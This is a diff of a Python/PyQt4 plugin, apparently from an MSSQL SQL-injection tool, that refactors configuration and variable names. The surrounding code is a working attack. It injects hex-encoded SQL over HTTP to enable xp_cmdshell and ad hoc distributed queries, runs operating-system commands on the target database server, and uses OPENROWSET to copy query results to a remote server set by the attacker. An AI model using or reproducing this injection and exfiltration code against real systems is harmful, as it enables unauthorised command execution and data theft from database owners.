@@ -20,21 +20,26 @@ from core.e_const import CONFIG_PATH
 from core.http import HTTP_Handler
 from PyQt4 import QtCore, QtGui
 
-from gui.mssql.openrowset.Ui_openrowset import Ui_OpenrowsetWidget
+from .ui.Ui_openrowset import Ui_OpenrowsetWidget
+
 
 PLUGIN_NAME = "OPENROWSET"
+PLUGIN_GROUP = "mssql"
+PLUGIN_CLASS_NAME = "OpenrowsetWidget"
+PLUGIN_DESCRIPTION = "Query result insertion from remote server to own sql server"
+
 
 class OpenrowsetWidget(QtGui.QWidget):
     
     logSignal = QtCore.pyqtSignal(str)
      
-    def __init__(self, vars, qstring, parent=None):
+    def __init__(self, vars, qstrings, parent=None):
         QtGui.QWidget.__init__(self, parent, QtCore.Qt.Tool)
         self.ui = Ui_OpenrowsetWidget()
         self.ui.setupUi(self)
         self.setWindowModality(QtCore.Qt.ApplicationModal)
         self.vars = vars
-        self.qstring = qstring
+        self.qstrings = qstrings
         self.ui.progressBar.hide()
         self.ui.openrowsetGroup.setEnabled(False)
         
@@ -47,11 +52,11 @@ class OpenrowsetWidget(QtGui.QWidget):
         #Load config
         if os.path.exists(CONFIG_PATH):
             settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.IniFormat)
-            self.ui.driverBox.setCurrentIndex(settings.value('OPENROWSET/driver', 0, int))
-            self.ui.lineIP.setText(settings.value('OPENROWSET/ip', ''))
-            self.ui.lineUsername.setText(settings.value('OPENROWSET/username', ''))
-            self.ui.linePassword.setText(settings.value('OPENROWSET/password', ''))
-            self.ui.lineDB.setText(settings.value('OPENROWSET/database', ''))
+            self.ui.driverBox.setCurrentIndex(settings.value(PLUGIN_NAME + '/driver', 0, int))
+            self.ui.lineIP.setText(settings.value(PLUGIN_NAME + '/ip', ''))
+            self.ui.lineUsername.setText(settings.value(PLUGIN_NAME + '/username', ''))
+            self.ui.linePassword.setText(settings.value(PLUGIN_NAME + '/password', ''))
+            self.ui.lineDB.setText(settings.value(PLUGIN_NAME + '/database', ''))
             if settings.value("Main/window_position") is not None: 
                 self.move(settings.value("Main/window_position"))
         #---
@@ -124,7 +129,7 @@ class OpenrowsetWidget(QtGui.QWidget):
         self.vars['password'] = self.ui.linePassword.text()
         self.vars['db'] = self.ui.lineDB.text()
         self.ui.progressBar.show()
-        self.worker = Worker(self.vars, self.qstring)
+        self.worker = Worker(self.vars, self.qstrings)
         #Signal connects
         self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.QueuedConnection)
         self.worker.connResultSignal.connect(self.setConnectionStatus, type=QtCore.Qt.QueuedConnection)
@@ -138,7 +143,7 @@ class OpenrowsetWidget(QtGui.QWidget):
             return
         self.vars['task'] = "enable"
         self.ui.progressBar.show()
-        self.worker = Worker(self.vars, self.qstring)
+        self.worker = Worker(self.vars, self.qstrings)
         self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.QueuedConnection)
         self.worker.taskDoneSignal.connect(self.taskDone, type=QtCore.Qt.QueuedConnection)
         self.worker.start()
@@ -197,7 +202,7 @@ class OpenrowsetWidget(QtGui.QWidget):
         self.ui.tableWidget.setHorizontalHeaderLabels(self.vars['select'])
         self.ui.tableWidget.setRowCount(int(self.ui.lineRowsCount.text()))
         self.ui.progressBar.show()
-        self.worker = Worker(self.vars, self.qstring)
+        self.worker = Worker(self.vars, self.qstrings)
         
         #Signal connects
         self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.QueuedConnection)
@@ -210,12 +215,12 @@ class OpenrowsetWidget(QtGui.QWidget):
     #When widget closing
     def closeEvent(self, event):
         #Saving settings
-        settings = QtCore.QSettings("settings/enema.ini", QtCore.QSettings.IniFormat)
-        settings.setValue('OPENROWSET/driver', self.ui.driverBox.currentIndex())
-        settings.setValue('OPENROWSET/ip', self.ui.lineIP.text())
-        settings.setValue('OPENROWSET/username', self.ui.lineUsername.text())
-        settings.setValue('OPENROWSET/password', self.ui.linePassword.text())
-        settings.setValue('OPENROWSET/database', self.ui.lineDB.text())
+        settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.IniFormat)
+        settings.setValue(PLUGIN_NAME + '/driver', self.ui.driverBox.currentIndex())
+        settings.setValue(PLUGIN_NAME + '/ip', self.ui.lineIP.text())
+        settings.setValue(PLUGIN_NAME + '/username', self.ui.lineUsername.text())
+        settings.setValue(PLUGIN_NAME + '/password', self.ui.linePassword.text())
+        settings.setValue(PLUGIN_NAME + '/database', self.ui.lineDB.text())
         settings.sync()
 
     
@@ -226,10 +231,10 @@ class Worker(QtCore.QThread):
     connResultSignal = QtCore.pyqtSignal(bool)
     taskDoneSignal = QtCore.pyqtSignal()
     
-    def __init__(self, vars, qstring):
+    def __init__(self, vars, qstrings):
         QtCore.QThread.__init__(self)
         self.vars = vars
-        self.qstring = qstring
+        self.qString = qstrings.value('mssql_error_based/exec_hex')
         self.wq = HTTP_Handler()
         self.wq.logSignal.connect(self.log)
         #if defined non-standart sql server port
@@ -241,7 +246,7 @@ class Worker(QtCore.QThread):
         #Connection String
         self.connStr = "DRIVER={SQL Server};SERVER=" + self.connIP + ";DATABASE="\
         + self.vars['db'] + ";UID=" + self.vars['username'] + ";PWD=" + self.vars['password']
-        
+    
     def log(self, logStr):
         self.logSignal.emit(logStr)
     
@@ -269,17 +274,17 @@ class Worker(QtCore.QThread):
             createStr = createStr.replace("dtpropertie", "dtpropertiecmd")
             #delete table if exists
             hex = core.txtproc.strToHex("drop table dtpropertiecmd", True)
-            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+            query = self.wq.buildQuery(self.qString, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
             #Creating table
             hex = core.txtproc.strToHex(createStr, True)
-            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+            query = self.wq.buildQuery(self.qString, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
             #Insert xp_cmdshell output to table
             hex= core.txtproc.strToHex("insert dtpropertiecmd exec master..xp_cmdshell '" + self.vars['command'] + "'", True)
-            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+            query = self.wq.buildQuery(self.qString, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
         else:
             return createStr
@@ -309,13 +314,13 @@ class Worker(QtCore.QThread):
         #Enbale xp_cmdshell request
         hex = core.txtproc.strToHex(\
         "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure", True)
-        query =  self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+        query =  self.wq.buildQuery(self.qString, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
 
         #Enbale openrowset request
         hex = core.txtproc.strToHex(\
         "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure", True)
-        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+        query = self.wq.buildQuery(self.qString, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
     
     def opernrowsetWorker(self):
@@ -363,7 +368,7 @@ class Worker(QtCore.QThread):
         
         #Inserting data into sql server
         hex = core.txtproc.strToHex(openrowsetString, True)
-        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+        query = self.wq.buildQuery(self.qString, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
 
         try:
@@ -383,7 +388,7 @@ class Worker(QtCore.QThread):
         #deleting xp_cmdshell temp table
         if self.vars['CMD']:
             hex = core.txtproc.strToHex("drop table dtpropertiecmd", True)
-            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
+            query = self.wq.buildQuery(self.qString, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
         ##Deleting tamporaty table
